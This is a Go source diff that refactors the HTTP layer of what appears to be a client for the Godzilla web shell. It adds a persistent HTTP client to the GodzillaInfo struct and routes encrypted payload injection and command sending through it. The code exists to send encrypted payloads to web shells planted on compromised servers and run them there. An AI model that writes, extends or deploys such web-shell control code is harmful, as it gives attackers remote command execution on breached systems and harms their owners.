@@ -17,7 +17,7 @@ import (
 )
 
 type GodzillaInfo struct {
-	shell.BaseShell
+	BaseShell
 	Key       string
 	secretKey []byte
 	// 哥斯拉的一些加密模式
@@ -41,6 +41,10 @@ func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
 	}
 	g.encoding = godzilla.EncodingCharset{}
 	g.encoding.SetCharset(g.Encoding)
+	if g.Headers == nil {
+		g.Headers = make(map[string]string, 2)
+	}
+	g.Client = httpx.NewClient(g.Proxy, g.Headers, g.Script, g.Crypto)
 	return g, nil
 }
 
@@ -93,7 +97,7 @@ func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
 	var enData []byte
 	if g.Script == shell.AspScript {
 		enData = godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(enData), 0, 0)
+		result, ok := g.Client.DoRequest(g.Url, string(enData), 0, 0)
 		if !ok {
 			panic("EvalFunc1 error")
 		}
@@ -102,7 +106,7 @@ func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
 	} else {
 		gzipData, _ := gzip.GzipCompress(payload)
 		enData = godzilla.Encrypto(gzipData, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(enData), 0, 0)
+		result, ok := g.Client.DoRequest(g.Url, string(enData), 0, 0)
 		if !ok {
 			panic("EvalFunc1 error")
 		}
@@ -149,7 +153,7 @@ func getParameter() *godzilla.Parameter {
 func (g *GodzillaInfo) InjectPayload() {
 	payload := g.GetPayload()
 	data := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-	_, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(data), 0, 0)
+	_, ok := g.Client.DoRequest(g.Url, string(data), 0, 0)
 	if !ok {
 		panic("EvalFunc error")
 	}
